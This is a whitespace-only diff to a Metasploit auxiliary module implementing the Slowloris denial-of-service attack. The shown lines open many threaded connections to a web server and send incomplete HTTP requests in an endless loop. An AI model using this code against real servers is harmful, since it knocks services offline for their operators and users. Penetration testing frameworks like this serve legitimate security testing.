@@ -11,7 +11,7 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(
       info,
       'Name'            => 'Slow Loris DoS',
-      'Description'     => %q{Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. 
+      'Description'     => %q{Slowloris tries to keep many connections to the target web server open and hold them open as long as possible.
                               It accomplishes this by opening connections to the target web server and sending a partial request. 
                               Periodically, it will send subsequent requests, adding to but never completing the request.},
       'License'         => MSF_LICENSE,
@@ -48,11 +48,11 @@ class MetasploitModule < Msf::Auxiliary
       starting_thread = 1
       header = "GET / HTTP/1.1\r\n"
       threads = []
-    
       while true do
+
         ubound = [thread_count].min
         print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")
-        
+
         1.upto(ubound) do |i|
           threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
             begin
